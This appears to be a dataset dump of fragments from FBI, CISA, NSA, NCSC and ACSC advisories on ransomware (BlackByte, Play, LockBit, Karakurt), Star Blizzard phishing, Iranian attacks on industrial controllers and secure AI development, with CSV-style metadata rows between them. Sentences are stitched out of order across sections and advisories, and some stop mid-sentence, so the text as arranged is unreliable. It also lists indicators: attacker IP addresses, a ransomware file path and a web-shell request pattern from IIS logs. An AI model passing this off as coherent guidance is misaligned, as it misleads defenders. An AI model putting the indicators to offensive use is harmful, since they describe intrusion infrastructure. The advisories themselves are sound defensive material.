MITIGATIONS  The FBI, NSA, and CISA encourage all CDCs, with or without evidence of compromise, to apply the  following mitigations to reduce the risk of compromise by this threat actor. Automation and platform features (e.g., Group Managed Service  Accounts, gMSA) can provide automatic and periodic complex password management for  service accounts, reducing the threat surface against single factor authentication assertions.7               FBI | NSA | CISA TLP:WHITE  Page 9 of 19 | Product ID: AA22-047A  TLP:WHITE Enforce Strong, Unique Passwords  •  Require accounts to have strong, unique passwords. Threat actors often use PowerShell to hide their  malicious activities.14  •  Update PowerShell instances to version 5.0 or later and uninstall all earlier versions of  PowerShell. o Subscribe to CISA cybersecurity notifications and advisories to keep up with  known exploited vulnerabilities, security updates, and threats. •  Sign up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce  exposure to threats. These tools allow a high degree of  visibility into the security status of endpoints and can be an effective defense against threat  actors. Maintain Rigorous Configuration Management Programs    •  Audit configuration management programs to ensure they can track and mitigate emerging  threats. Having  a robust configuration program hinders sophisticated threat operations by limiting the  effectiveness of opportunistic attacks.16  Enforce the Principle of Least Privilege  •  Apply the principle of least privilege. Threat actors are known to exploit trust  relationships between providers and their customers to gain access to customer networks and  data. •  Ensure that employees are aware of what to do and whom to contact when they see  suspicious activity or suspect a cyber intrusion to help quickly and efficiently identify  threats and employ mitigation strategies. To request incident response resources  or technical assistance related to these threats, contact CISA at Central@cisa.gov. Defense Industrial Base companies may  additionally sign up for NSA’s free cybersecurity services, including Protective DNS, vulnerability  scanning, and threat intelligence collaboration at dib_defense@cyber.nsa.gov. The actors often maintain persistence by using legitimate credentials and a variety of  malware when exfiltrating emails and data. Although  the actors have used a variety of malware to maintain persistence, the FBI, NSA, and CISA have also  observed intrusions that did not rely on malware or other persistence mechanisms. Employ Antivirus Programs   •  Ensure that antivirus applications are installed on all organizations’ computers and are  configured to prevent spyware, adware, and malware as part of the operating system security  baseline."
Indicators of Compromise Associated with BlackByte Ransomware,2022-02-11,1,"{'ransomware': 14, 'threats_of_violence': 2}","TLP: WHITE Product ID: CU-000163-MW  February 11, 2022 TLP:WHITE Co-Authored by:  Indicators of Compromise Associated with  BlackByte Ransomware  SUMMARY  This joint Cybersecurity Advisory was developed by the Federal Bureau of Investigation (FBI)  and the U.S. Secret Service (USSS) to provide information on BlackByte ransomware. As of  November 2021, BlackByte ransomware had compromised multiple US and foreign  businesses, including entities in at least three US critical infrastructure sectors (government  facilities, financial, and food & agriculture). BlackByte is a Ransomware as a Service (RaaS)  group that encrypts files on compromised Windows host systems, including physical and  virtual servers. In some instances, BlackByte ransomware actors have only  partially encrypted files. Previous versions of BlackByte ransomware downloaded a .png file from IP addresses  185.93.6.31 and 45.9.148.114 prior to encryption. BlackByte ransomware runs executables  from c:\windows\system32\ and C:\Windows\. %HOMEPATH%\complex.exe  This file is the ransomware executable. This command appears to launch the ransomware. IIS logs contain GET and POST requests to various malicious ASPX files that follow a  pattern of ""<FILE_PATH>/<SUSPICIOUS_FILENAME>.aspxexec_code=Response.Write""    Below is a list of hashes of

TECHNICAL DETAILS  Cybersecurity authorities in the United States, Australia, and the United Kingdom observed the  following behaviors and trends among cyber criminals in 2021:  •  Gaining access to networks via phishing, stolen Remote Desktop Protocols (RDP)  credentials or brute force, and exploiting vulnerabilities. Phishing emails, RDP  exploitation, and exploitation of software vulnerabilities remained the top three initial infection  vectors for ransomware incidents in 2021. •  Implement a user training program and phishing exercises to raise awareness among  users about the risks of visiting suspicious websites, clicking on suspicious links, and opening  suspicious attachments. Reinforce the appropriate user response to phishing and  spearphishing emails. After encrypting victim networks, ransomware  threat actors increasingly used “triple extortion” by threatening to (1) publicly release stolen  sensitive information, (2) disrupt the victim’s internet access, and/or (3) inform the victim’s  partners, shareholders, or suppliers about the incident. The ACSC continued to observe  “double extortion” incidents in which a threat actor uses a combination of encryption and data  theft to pressure victims to pay ransom demands. TLP: WHITE   TLP:WHITE Co-Authored by:  Product ID: AA22-040A February 9, 2022 2021 Trends Show Increased Globalized Threat  of Ransomware   SUMMARY  In 2021, cybersecurity authorities in the United  States,[1][2][3] Australia,[4] and the United  Kingdom[5] observed an increase in sophisticated,  high-impact ransomware incidents against critical  infrastructure organizations globally. The Federal  Bureau of Investigation (FBI), the Cybersecurity and  Infrastructure Security Agency (CISA), and the  National Security Agency (NSA) observed incidents  involving ransomware against 14 of the 16 U.S. The Australian Cyber Security  Centre (ACSC) observed continued ransomware  targeting of Australian critical infrastructure entities,  including in the Healthcare and Medical, Financial Services and Markets, Higher Education and  Research, and Energy Sectors. The United Kingdom’s National Cyber Security Centre (NCSC-UK)  recognizes ransomware as the biggest cyber threat facing the United Kingdom. Education is one of  the top UK sectors targeted by ransomware actors, but the NCSC-UK has also seen attacks targeting  businesses, charities, the legal profession, and public services in the Local Government and Health  Sectors. Immediate Actions You Can Take Now to  Protect Against Ransomware:  •  Update your operating system and  software. FBI | CISA | ACSC | NCSC-UK  TLP:WHITE  Page 2 of 9  |  Product ID: AA22-040A  TLP: WHITE Ransomware tactics and techniques continued to evolve in 2021, which demonstrates ransomware  threat actors’ growing technological sophistication and an increased ransomware threat to  organizations globally. This joint Cybersecurity Advisory—authored by cybersecurity authorities in the United States,  Australia, and the United Kingdom—provides observed behaviors and trends as well as mitigation  recommendations to help network defenders reduce their risk of compromise by ransomware. Once a ransomware threat actor has gained code  execution on a device or network access, they can deploy ransomware. The market for ransomware became increasingly  “professional” in 2021, and the criminal business model of ransomware is now well  established. In addition to their increased use of ransomware-as-a-service (RaaS),  ransomware threat actors employed independent services to negotiate payments, assist  victims with making payments, and arbitrate payment disputes between themselves and other  cyber criminals. NCSC-UK observed that some ransomware threat actors offered their victims  the services of a 24/7 help center to expedite ransom payment and restoration of encrypted  systems or data. Note: cybersecurity authorities in the United States, Australia, and the United Kingdom assess  that if the ransomware criminal business model continues to yield financial returns for  ransomware actors, ransomware incidents will become more frequent. Every time a ransom is  paid, it confirms the viability and financial attractiveness of the ransomware criminal business  model. Additionally, cybersecurity authorities in the United States, Australia, and the United  Kingdom note that the criminal business model often complicates attribution because there  are complex networks of developers, affiliates, and freelancers; it is often difficult to identify  conclusively the actors behind a ransomware incident. Eurasian ransomware groups have shared victim information  with each other, diversifying the threat to targeted organizations. For example, after  announcing its shutdown, the BlackMatter ransomware group transferred its existing victims to  infrastructure owned by another group, known as Lockbit 2.0. In October 2021, Conti                 FBI | CISA | ACSC | NCSC-UK  TLP:WHITE  Page 3 of 9  |  Product ID: AA22-040A  TLP: WHITE ransomware actors began selling access to victims’ networks, enabling follow-on attacks by  other cyber threat actors. o In the first half of 2021, cybersecurity authorities in the United States and Australia  observed ransomware threat actors targeting “big game” organizations—i.e., perceived  high-value organizations and/or those that provide critical services—in several high- profile incidents. However, ransomware groups suffered disruptions from U.S. Subsequently, the FBI observed some ransomware threat  actors redirecting ransomware efforts away from “big-game” and toward mid-sized  victims to reduce scrutiny. o The ACSC observed ransomware continuing to target Australian organizations of all  sizes, including critical services and “big game,” throughout 2021. Ransomware groups have increased their impact by:  •  Targeting the cloud. Ransomware developers targeted cloud infrastructures to exploit known  vulnerabilities in cloud applications, virtual machine software, and virtual machine  orchestration software. Ransomware threat actors also targeted cloud accounts, cloud  application programming interfaces (APIs), and data backup and storage systems to deny  access to cloud resources and encrypt data. Ransomware threat actors  have also targeted cloud service providers to encrypt large amounts of customer data. Ransomware threat actors have targeted managed  service providers (MSPs). By compromising an MSP, a ransomware threat actor could access multiple  victims through one initial compromise. Cybersecurity authorities in the United States,  Australia, and the United Kingdom assess there will be an increase in ransomware incidents  where threat actors target MSPs to reach their clients. Although most ransomware incidents against critical  infrastructure affect business information and technology systems, the FBI observed that                 FBI | CISA | ACSC | NCSC-UK  TLP:WHITE  Page 4 of 9  |  Product ID: AA22-040A  TLP: WHITE several ransomware groups have developed code designed to stop critical infrastructure or  industrial processes. Globally, in 2021, ransomware threat actors targeted  software supply chain entities to subsequently compromise and extort their customers. Targeting software supply chains allows ransomware threat actors to increase the scale of  their attacks by accessing multiple victims through a single initial compromise. Ransomware threat actors may view holidays and weekends— when offices are normally closed—as attractive timeframes, as there are fewer network  defenders and IT support personnel at victim organizations. For more information, see joint  FBI-CISA Cybersecurity Advisory, Ransomware Awareness for Holidays and Weekends. MITIGATIONS  Cybersecurity authorities in the United States, Australia, and the United Kingdom recommend  network defenders apply the following mitigations to reduce the likelihood and impact of ransomware  incidents:  •  Keep all operating systems and software up to date. The security modules may prevent the operating system from making  arbitrary connections, which is an effective mitigation strategy against ransomware, as well as  against remote code execution (RCE). Network segmentation can help prevent the spread of ransomware by  controlling traffic flows between—and access to—various subnetworks and by restricting  adversary lateral movement. For example, the ACSC has observed ransomware and data theft incidents in which  Australian divisions of multinational companies were impacted by ransomware incidents  affecting assets maintained and hosted by offshore divisions (outside their control). Deploying mutual Transport Layer Security (mTLS) can  prevent eavesdropping on communications, which, in turn, can prevent cyber threat actors  from gaining insights needed to advance a ransomware attack. FBI | CISA | ACSC | NCSC-UK  TLP:WHITE  Page 6 of 9  |  Product ID: AA22-040A  TLP: WHITE •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a network-monitoring tool. To aid in detecting the  ransomware, leverage a tool that logs and reports all network traffic, including lateral  movement on a network. Artificial intelligence (AI)-enabled network intrusion detection systems (NIDS) are also  able to detect and block many anomalous behaviors associated with early stages of  ransomware deployment. Note: critical infrastructure organizations with industrial control systems/operational technology  networks should review joint CISA-FBI Cybersecurity Advisory DarkSide Ransomware: Best Practices  for Preventing Business Disruption from Ransomware Attacks for more recommendations, including  mitigations to reduce the risk of severe business or functional degradation should their entity fall  victim to ransomware. RESPONDING TO RANSOMWARE ATTACKS  If a ransomware incident occurs at your organization, cybersecurity authorities in the United States,  Australia, and the United Kingdom recommend organizations:  •  Follow the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information  Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide. Criminal activity is motivated by financial gain, so  paying a ransom may embolden adversaries to target additional organizations (or re-target the same  organization) or encourage cyber criminals to engage in the distribution of ransomware. Additionally, reducing the  financial gain of ransomware threat actors will help disrupt the ransomware criminal business model. While it continues to prove challenging, the  NCSC-UK has supported UK Government efforts by identifying needed policy changes—including  measures about the cyber insurance industry and ransom payments—that could reduce the threat of  ransomware. RESOURCES  •  For more information and resources on protecting against and responding to ransomware,  refer to StopRansomware.gov, a centralized, U.S. whole-of-government webpage providing  ransomware resources and alerts. •  CISA’s Ransomware Readiness Assessment is a no-cost self-assessment based on a tiered  set of practices to help organizations better assess how well they are equipped to defend and  recover from a ransomware incident. •  CISA offers a range of no-cost cyber hygiene services to help critical infrastructure  organizations assess, identify, and reduce their exposure to threats, including ransomware. •  Refer to the ACSC’s practical guides on how to protect yourself against ransomware attacks  and what to do if you are held to ransom at cyber.gov.au. •  Refer to NCSC-UK’s guides on how to protect yourself against ransomware attacks and how  to respond to and recover from them at ncsc.gov.uk/ransomware/home. To request incident response resources or technical assistance related to these threats, contact CISA  at CISAServiceDesk@cisa.dhs.gov. In addition to exploiting weaknesses to gain  direct access, threat actors sometimes reach cloud storage systems by compromising local  (on-premises) devices and moving laterally to the cloud systems. Timely patching is one of the most  efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. Threat actors use SMB to propagate malware across organizations. Organizations with an international footprint should be aware that  connectivity between their overseas arms can expand their threat surface; these organizations  should implement network segmentation between international divisions where appropriate. Enforcing credential protection—by restricting where  accounts and credentials can be used and by using local device credential protection  features—reduces opportunities for threat actors to collect credentials for lateral movement  and privilege escalation. If threat actors are not able to run  these tools, they will have difficulty escalating privileges and/or moving laterally. If possible, scan backup data with an antivirus program to check that it is free  of malware."

The FBI does not encourage paying ransoms. It may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit  activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI urges  you to promptly report ransomware incidents to your local field office and/or file a complaint  on www.ic3.gov. Doing so provides the FBI with critical information needed to prevent future       TLP:WHITE  TLP:WHITE  attacks by identifying and tracking ransomware attackers and holding them accountable under  US law. Recommended Mitigations:  FBI recommends network defenders apply the following mitigations to reduce the risk of  compromise by LockBit 2.0 ransomware:   Require all accounts with password logins (e.g., service account, admin accounts, and  domain admin accounts) to have strong, unique passwords. To limit an adversary from learning the organization’s enterprise environment, limit  common system and network discovery techniques by taking the following actions:   Segment networks to prevent the spread of ransomware. Network segmentation can  help prevent the spread of ransomware by controlling traffic flows between—and  access to—various subnetworks and by restricting adversary lateral movement.  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network.

Potential for Malicious Cyber Activities to Disrupt the 2022 Beijing Winter Olympics and Paralympics,2022-01-31,1,"{'phishing': 5, 'ransomware': 6, 'threats_of_violence': 8, 'malware': 8}","These  activities include distributed denial of service (DDoS) attacks, ransomware, malware, social engineering,  data theft or leaks, phishing campaigns, disinformation campaigns, or insider threats, and when  successful, can block or disrupt the live broadcast of the event, steal or leak sensitive data, or impact  public or private digital infrastructure supporting the Olympics. Adversaries could use social  engineering and phishing campaigns leading up to and during the event to implant malware to disrupt  networks broadcasting the event. While there were no major cyber disruptions, the most popular attack methods used  were malware, email spoofing, phishing and the use of fake websites and streaming services designed to  look like official Olympic service providers. During the 2018 PyeongChang Winter Olympics, Russian cyber actors conducted a destructive cyber  attack against the opening ceremony, enabled through spearphishing campaigns and malicious mobile  applications. To help prevent targeted social engineering,  ransomware, and phishing scams, ensure that employees and stakeholders are aware of potential  cyber threats and how they are delivered. Cyber actors could use ransomware or other malicious tools and  services available for purchase to execute DDoS attacks against Internet service providers and television  broadcast companies to interrupt service during the Olympics. Ransomware Best Practices   The FBI does not recommend paying ransoms. Regardless of whether  the ransom was paid, the FBI urges organizations to report ransomware incidents to a local FBI field     TLP:WHITE      TLP:WHITE  office or file a report with the FBI’s Internet Crime Complaint Center (IC3) at IC3.gov. • Create, maintain, and exercise a basic cyber incident response plan that includes procedures for  response and notification in a ransomware incident and plans for the possibility of critical systems  being inaccessible for a period of time.

The FBI to date is not aware of any specific cyber  threat against the Olympics, but encourages partners to remain vigilant and maintain best practices in  their network and digital environments. Threat  As we mentioned in PIN 20210719-001, large, high-profile events provide an opportunity for criminal  and nation-state cyber actors to make money, sow confusion, increase their notoriety, discredit  adversaries, and advance ideological goals. The FBI also suggests  reviewing or establishing security policies, user agreements, and patching plans to address current  threats posed by malicious cyber actors. Ensure that employees are aware of what to do and  who to contact when they see suspicious activity or suspect a cyberattack, to help quickly and efficiently  identify threats and employ mitigation strategies. The download and use of applications, including those required to participate or stay  in country, could increase the opportunity for cyber actors to steal personal information or install  tracking tools, malicious code, or malware1.

TLP:CLEAR Product ID: AA23-352A December 18, 2023 Co-Authored by:  TLP:CLEAR #StopRansomware: Play Ransomware  SUMMARY  Note: This joint Cybersecurity Advisory (CSA) is part  of an ongoing #StopRansomware effort to publish  advisories for network defenders that detail various  ransomware variants and ransomware threat actors. These  #StopRansomware  advisories  include  recently  and  historically  observed  tactics,  techniques, and procedures (TTPs) and indicators of  compromise (IOCs) to help organizations protect  against ransomware. Visit stopransomware.gov to  see all #StopRansomware advisories and to learn  more about other ransomware threats and no-cost  resources. The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA),  and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing  this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI  investigations as recently as October 2023. Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range  of businesses and critical infrastructure in North America, South America, and Europe. As of October  2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the  ransomware actors. In Australia, the first Play ransomware incident was observed in April 2023, and most recently in  November 2023. The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of  deals,” according to a statement on the group’s data leak website. Ransom notes do not include an  Actions to take today to mitigate cyber  threats from Play ransomware:  • Prioritize remediating known exploited  vulnerabilities. The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the  Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. Initial Access  The Play ransomware group gains initial access to victim networks through the abuse of valid  accounts [T1078] and exploitation of public-facing applications [T1190], specifically through known  FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell [CVE- 2022-41040 and CVE-2022-41082]) vulnerabilities. Play ransomware actors have been observed to  use external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual Private  Networks (VPN) for initial access. Discovery and Defense Evasion  Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba  [1], an information-stealer, to enumerate network information [T1016] and scan for anti-virus software  [T1518.001]. In some instances, cybersecurity researchers have  observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.[2]  Lateral Movement and Execution  Play ransomware actors use command and control (C2) applications, including Cobalt Strike and  SystemBC, and tools like PsExec, to assist with lateral movement and file execution. Once  established on a network, the ransomware actors search for unsecured credentials [T1552] and use  the Mimikatz credential dumper to gain domain administrator access [T1003]. According to open  source reporting [2], to further enumerate vulnerabilities, Play ransomware actors use Windows  Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation  paths. Page 3 of 10  |  Product ID: AA23-352A  FBI | CISA | ACSC TLP:CLEAR  TLP:CLEAR Exfiltration and Encryption  Play ransomware actors often split compromised data into segments and use tools like WinRAR to  compress files [T1560.001] into .RAR format for exfiltration.

The FBI, CISA, and ASD’s  ACSC  recommend  that  software  manufacturers incorporate secure-by- design and -default principles and tactics  into their software development practices  to limit the impact of ransomware  techniques  (such  as  threat  actors  leveraging backdoor vulnerabilities into  remote  software  systems),  thus,  strengthening the security posture for  their customers. •  Segment networks [CPG 2.F] to prevent the spread of ransomware. Network segmentation  can help prevent the spread of ransomware by controlling traffic flows between—and access  to—various subnetworks and by restricting adversary lateral movement. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network [CPG 1.E]. RESOURCES  •  Stopransomware.gov is a whole-of-government approach that gives one central location for  ransomware resources and alerts. •  Resource to mitigate a ransomware attack: #StopRansomware Guide. •  No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness  Assessment. REPORTING  The FBI is seeking any information that can be shared, to include boundary logs showing  communication to and from foreign IP addresses, a sample ransom note, communications with Play  ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an  encrypted file. Furthermore, payment may also embolden adversaries to target  additional organizations, encourage other criminal actors to engage in the distribution of ransomware,         Page 10 of 10  |  Product ID: AA23-352A  FBI | CISA | ACSC TLP:CLEAR  TLP:CLEAR and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the  ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field  Office, the FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center  (report@cisa.gov or 888-282-0870). Australian organizations that have been impacted or require assistance in regard to a ransomware  incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to  cyber.gov.au.

TLP:WHITE  Product ID: AA22-152A June 1, 2022 TLP: WHITE Co-Authored by:  Karakurt Data Extortion Group   SUMMARY  The Federal Bureau of Investigation (FBI), the  Cybersecurity and Infrastructure Security Agency  (CISA), the Department of the Treasury (Treasury),  and the Financial Crimes Enforcement Network  (FinCEN) are releasing this joint Cybersecurity  Advisory (CSA) to provide information on the  Karakurt data extortion group, also known as the  Karakurt Team and Karakurt Lair. Known ransom demands have  ranged from $25,000 to $13,000,000 in Bitcoin, with payment deadlines typically set to expire within a  week of first contact with the victim. Extortion  Following the exfiltration of data, Karakurt actors present the victim with ransom notes by way of  “readme.txt” files, via emails sent to victim employees over the compromised email networks, and  emails sent to victim employees from external email accounts. Although Karakurt’s primary extortion leverage is a promise to delete stolen data and keep the  incident confidential, some victims reported Karakurt actors did not maintain the confidentiality of  victim information after a ransom was paid. In some cases, Karakurt actors have conducted extortion against victims previously attacked by other  ransomware variants. Karakurt victims have reported extensive harassment campaigns by Karakurt actors in which  employees, business partners, and clients receive numerous emails and phone calls warning the  recipients to encourage the victims to negotiate with the actors to prevent the dissemination of victim  data. Upon payment of  ransoms, Karakurt actors have provided some form of proof of deletion of files and, occasionally, a  brief statement explaining how the initial intrusion occurred. Actions to take today to mitigate cyber  threats from ransomware:  •  Prioritize patching known  exploited vulnerabilities. Intrusion brokers then sell access to these compromised computer systems to other  cybercriminal actors, such as those engaged in ransomware, business email  compromise, corporate and government espionage, etc. Karakurt actors have also targeted victims at the same time these victims were  under attack by other ransomware actors. In such cases, victims received ransom notes from multiple  ransomware variants simultaneously, suggesting Karakurt actors purchased access to a  compromised system that was also sold to another ransomware actor. RESOURCES  •  For additional resources related to the prevention and mitigation of ransomware, visit  Stopransomware.gov as well as the CISA-Multi-State Information Sharing and Analysis Center  (MS-ISAC) Joint Ransomware Guide and NIST’s Data Integrity: Detecting and Responding to  Ransomware and Other Destructive Events. Stopransomware.gov is the U.S. government’s  one-stop location for resources to tackle ransomware more effectively. •  CISA’s Ransomware Readiness Assessment is a no-cost self-assessment based on a tiered  set of practices to help organizations better assess how well they are equipped to defend and  recover from a ransomware incident. •  CISA offers a range of no-cost cyber hygiene services to help critical infrastructure  organizations assess, identify, and reduce their exposure to threats, including ransomware.

To report incidents and anomalous activity or to request incident response  resources or technical assistance related to these threats, contact CISA at report@cisa.gov. Karakurt victims have not reported encryption of compromised machines  or files; rather, Karakurt actors have claimed to steal data and threatened to auction it off or release it  to the public unless they receive payment of the demanded ransom. The ransom notes reveal the victim  has been hacked by the “Karakurt Team” and threaten public release or auction of the stolen data. government strongly discourage the  payment of any ransom to Karakurt threat actors, or any cyber criminals promising to delete stolen  files in exchange for payments."
Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns,2023-12-08,4,"{'phishing': 18, 'threats_of_violence': 2, 'malware': 1}","7 December 2023   Crown Copyright 2023  Advisory  Russian FSB cyber actor Star  Blizzard continues worldwide  spear-phishing campaigns. Russian FSB cyber actor Star  Blizzard continues worldwide  spear-phishing campaigns  The Russia-based actor is targeting organisations and  individuals in the UK and other geographical areas of  interest Overview  The Russia-based actor Star Blizzard (formerly known as SEABORGIUM, also  known as Callisto Group/TA446/COLDRIVER/TAG-53/BlueCharlie) continues  to successfully use spear-phishing attacks against targeted organisations  and individuals in the UK, and other geographical areas of interest, for  information-gathering activity. This advisory raises awareness of the spear-phishing techniques Star  Blizzard uses to target individuals and organisations. Outline of the attacks  The activity is typical of spear-phishing campaigns, where an actor targets  a specific individual or group using information known to be of interest to  the targets. In a spear-phishing campaign, an actor perceives their target  to have direct access to information of interest, be an access vector to  another target, or both. Preference for personal email addresses  Star Blizzard has predominantly sent spear-phishing emails to targets’  personal email addresses, although they have also used targets’ corporate  or business email addresses. Delivery of malicious link  Once trust is established, the attacker uses typical phishing tradecraft and  shares a link [T1566.002], apparently to a document or website of interest. Star Blizzard uses the open-source framework EvilGinx in their spear- phishing activity, which allows them to harvest credentials and session  cookies to successfully bypass the use of two-factor authentication [T1539;  T1550.004]. They have also used compromised email accounts for further  phishing activity [T1586.002]. Conclusion  Spear-phishing is an established technique used by many actors, and Star  Blizzard uses it successfully, evolving the technique to maintain their  success. In the UK you can report related suspicious activity to the NCSC  Information on effective defence against spear-phishing is included in the  ‘Mitigation’ section below. Resource  Development  T1585.0 02  Establish Accounts: Email  Accounts  Star Blizzard registers consumer  email accounts matching the names  of individuals they are impersonating  to conduct spear-phishing activity. Resource  Development  T1583.0 01  Acquire Infrastructure:  Domains  Star Blizzard registers domains to  host their phishing framework. Tactic  ID  Technique  Procedure  Resource  Development  T1586.0 02  Compromise Accounts:  Email Accounts  Star Blizzard has been observed  using compromised victim email  accounts to conduct spear-phishing  activity against contacts of the  original victim. Initial Access  T1566.0 01  Phishing: Spear-phishing  Attachment  Star Blizzard uses malicious links  embedded in email attachments to  direct victims to their credential- stealing sites. Initial Access  T1566.0 02  Phishing: Spear-phishing  Link  Star Blizzard sends spear-phishing  emails with malicious links directly to  credential-stealing sites, or to  documents hosted on a file-sharing  site, which then direct victims to  credential-stealing sites. Spear-phishing emails are tailored to avoid suspicion. See NCSC guidance: https://www.ncsc.gov.uk/phishing and https:// www.ic3.gov/Home/IndustryAlerts > Enable your email providers’ automated email scanning features. Microsoft Threat Intelligence Center (MSTIC) provides a list of observed  Indicators of Compromise (IOCs) in their SEABORGIUM blog1, but this is not  exhaustive. See  NCSC guidance: https://www.ncsc.gov.uk/guidance/multi-factor- authentication-online-services  and https://www.ncsc.gov.uk/guidance/setting-two-factor-authentication-2fa > Protect your devices and networks by keeping them up to date: use the  latest supported versions, apply security updates promptly, use anti-virus  and scan regularly to guard against known malware threats."

Background Information  The Iranian Government charged the IRGC, an armed force, with defending Iran’s revolutionary regime from  perceived internal and external threats. For more information on Iranian state-sponsored malicious cyber  activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and the FBI’s Iran Threat webpage. See Table 1  through Table 4 for threat actor activity mapped to MITRE ATT&CK tactics and techniques. Overview and History of Threat Actor Activity  CyberAv3ngers is an Iranian IRGC-affiliated cyber persona (also known as CyberAveng3rs or Cyber  Avengers) that has claimed responsibility for numerous attacks against critical infrastructure organizations  primarily in the water and energy sectors in the United States, Israel, and other  countries.[1][2][3][4][5][6][7][8][9][10] Since 2020, CyberAv3ngers has claimed responsibility for  cyberattacks in Israel, although several of these claimed compromises of critical infrastructure  organizations in Israel are false.[3] In October 2023, CyberAv3ngers claimed credit on their Telegram  Channel for cyberattacks against Israel-based PLCs. 18, 2024)  Threat Actor Activity Against U.S.-Based Unitronics Devices  Between November 2023 and January 2024, CyberAv3ngers targeted U.S.-based Unitronics PLC devices  used in multiple critical infrastructure industries, including the WWS Sector, likely in four separate waves of  cyberattacks.

Guidelines for secure AI system development,2023-11-28,4,{'threats_of_violence': 18},"AI systems are subject to novel security vulnerabilities that need to be considered alongside standard  cyber security threats. It  covers understanding risks and threat modelling, as well as specific topics and trade-offs to consider on  system and model design. Secure deployment    This section contains guidelines that apply to the deployment stage of the AI system development  life cycle, including protecting infrastructure and models from compromise, threat or loss, developing  incident management processes, and responsible release. However, AI systems are subject to novel security vulnerabilities that need to be considered alongside  standard cyber security threats. We define ML applications as applications that: 	> involve software components (models) that allow computers to recognise and bring context to patterns  in data without the rules having to be explicitly programmed by a human 	> generate predictions, recommendations, or decisions based on statistical reasoning As well as existing cyber security threats, AI systems are subject to new types of vulnerabilities. The level of sophistication  and the methods of attack will vary depending on the adversary targeting the AI system, so the guidelines  should be considered alongside your organisation’s use cases and threat profile. Raise staff awareness of threats and risks System owners and senior leaders understand threats to secure AI and their mitigations. Your data  scientists and developers maintain an awareness of relevant security threats and failure modes and  help risk owners to make informed decisions. You consider your threat model  and associated security mitigations alongside functionality, user experience, deployment environment,  performance, assurance, oversight, ethical and legal requirements, among other considerations. For example: 	> you consider supply chain security when choosing whether to develop in house or use external  components, for example: 	> your choice to train a new model, use an existing model (with or without fine-tuning) or  access a model via an external API is appropriate to your requirements 	> your choice to work with an external model provider includes a due diligence evaluation of  that provider’s own security posture 	> if using an external library, you complete a due diligence evaluation (for example, to  ensure the library has controls that prevent the system loading untrusted models without  immediately exposing themselves to arbitrary code execution9) 	> you implement scanning and isolation/sandboxing when importing third-party models or  serialised weights, which should be treated as untrusted third-party code and could enable  remote code execution Model the threats to your system As part of your risk management process, you apply a holistic process to assess the threats to your  system, which includes understanding the potential impacts to the system, users, organisations, and  wider society if an AI component is compromised or behaves unexpectedly7. This process involves  assessing the impact of AI-specific threats8 and documenting your decision making. Your assessment should consider that some threats may grow as AI systems  increasingly become viewed as high value targets, and as AI itself enables new, automated attack  vectors. Your decisions are  informed by your threat model, and are regularly reassessed as AI security research advances and  understanding of the threat evolves. 13 Guidelines for secure AI system development  14 This section contains guidelines that apply to the deployment stage of the AI system development life  cycle, including protecting infrastructure and models from compromise, threat or loss, developing incident  management processes, and responsible release. Your approach to confidentiality risk mitigation will depend considerably on the use case and the threat  model. When configuration is necessary, the default option should  be broadly secure against common threats (that is, secure by default). More information on threat modelling is available from the OWASP Foundation 8."

These MFA implementations are resistant to phishing and not suspectable to push  bombing or SIM swap attacks, which are techniques known to be used by Scattered Spider  actors. See CISA’s fact sheet Implementing Phishing-Resistant MFA for more information. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]: o Audit the network for systems using RDP. o Close unused RDP ports. o Enforce account lockouts after a specified number of attempts. o Apply phishing-resistant multifactor authentication (MFA). o Log RDP login attempts. In addition, the authoring authorities of this CSA recommend network defenders apply the following  mitigations to limit potential adversarial use of common system and network discovery techniques,  and to reduce the impact and risk of compromise by ransomware or data extortion actors:    Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary  data and servers in a physically separate, segmented, and secure location (i.e., hard drive,  storage device, the cloud).   Require phishing-resistant multifactor authentication (MFA) for all services to the extent  possible, particularly for webmail, virtual private networks (VPNs), and accounts that access  critical systems [CPG 2.H]. Scattered Spider threat actors, per trusted third parties, have typically engaged in data theft  for extortion and have also been known to utilize BlackCat/ALPHV ransomware alongside their usual  TTPs.   Monetized access to victim networks in numerous ways including extortion enabled by  ransomware and data theft [T1657]. Table 16: Exfiltration  Technique Title  ID  Use  Exfiltration  TA0010  Scattered Spider threat actors exfiltrate data from  a target network to for data extortion. Financial Theft  T1657  Scattered Spider threat actors monetized access  to victim networks in numerous ways including  extortion-enabled ransomware and data theft. Observably, Scattered Spider threat actors have exfiltrated data [TA0010] after gaining access and  threatened to release it without deploying ransomware; this includes exfiltration to multiple sites  including 